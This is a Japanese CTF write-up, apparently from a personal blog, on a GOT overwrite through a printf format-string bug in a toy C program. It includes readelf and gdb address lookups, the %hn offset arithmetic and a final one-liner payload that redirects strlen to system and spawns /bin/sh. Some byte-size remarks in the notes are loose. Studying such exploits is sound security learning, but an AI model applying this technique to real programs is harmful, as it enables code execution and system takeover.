---
layout: post
title: got overrite
date: 2017-04-21 11:42:35
categories: ctf
---

```
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {
  char str[128];
  fgets(str, 128, stdin);
  printf(str);

  fgets(str, 128, stdin);
  printf("%d\n", strlen(str));
  return 0;
}
```

## 方針

1. printf()でGOTOverWriteをして、strlen()関数をsystem関数に書き換える。
2. 2度目のfgets()でsystem関数の引数を設定
3. strlen(str)でシェルを起動

### GOT領域のアドレスを調べる
```
% readelf -r got

Relocation section '.rel.dyn' at offset 0x31c contains 2 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ffc  00000406 R_386_GLOB_DAT    00000000   __gmon_start__
0804a040  00000805 R_386_COPY        0804a040   stdin@GLIBC_2.0

Relocation section '.rel.plt' at offset 0x32c contains 5 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
0804a010  00000207 R_386_JUMP_SLOT   00000000   fgets@GLIBC_2.0
0804a014  00000307 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4
0804a018  00000507 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0
0804a01c  00000607 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
```
より、
`0804a018  00000507 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0`

### system関数のアドレスを調べる

```
kobad@kobad-virtual-machine ~/pwn> gdb -q got
Voltron loaded.
Reading symbols from got...(no debugging symbols found)...done.
gdb-peda$ b main
Breakpoint 1 at 0x80484f9
gdb-peda$ r
Starting program: /home/kobad/pwn/got
Breakpoint 1, 0x080484f9 in main ()
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xf7e41940 <system>

```

より、`0xf7e41940 <system>`

### %nフォーマット指定子

printfが出力している文字数をメモリに書き込む

* %n   - 4 byte
* %hn  - 2 byte
* %hhn - 1 byte

`%n$s` - (スタックの?)n番目の値を%s型で表示

## 解答
strlen = 0x0804a018

system = 0xf7e41940

0x0804a018 - 0x0804a019 にsystemの下位4byte

0x0804a01a - 0x0804a01b にsystemの上位4byteを書き込む

0x1940 = 6464 で\x18\xa0\x04\x08\x1a\xa0\x04\x08この分の8byteを引く

0x1940 - 0x08 = 6456

0xf7e4 = 63460 で0x1940を引く

0xf7e4 - 0x1940 = 56996

スタックには8byteずつ積まれていくので、
最初の8byte(\x18\xa0\x04\x08) が11番目

次の8byte(\x1a\xa0\x04\x08) が12番目

11番目の0x0804a018に0xa1940を書き込み(0x0804a018 == 0xa1940ってこと？)、
12番目の0x0804a01aに0xf7e4を書き込む。

これでstrlenがsystem関数に書き換わった。

\nで次のfgets()へいき、/bin/shを与えて、
strlen(/bin/sh) == system(/bin/sh)なのでshellが起動する

`(echo -e '\x18\xa0\x04\x08\x1a\xa0\x04\x08%6456x%11$hn%56996x%12$hn\n/bin/sh'; cat) | ./got `
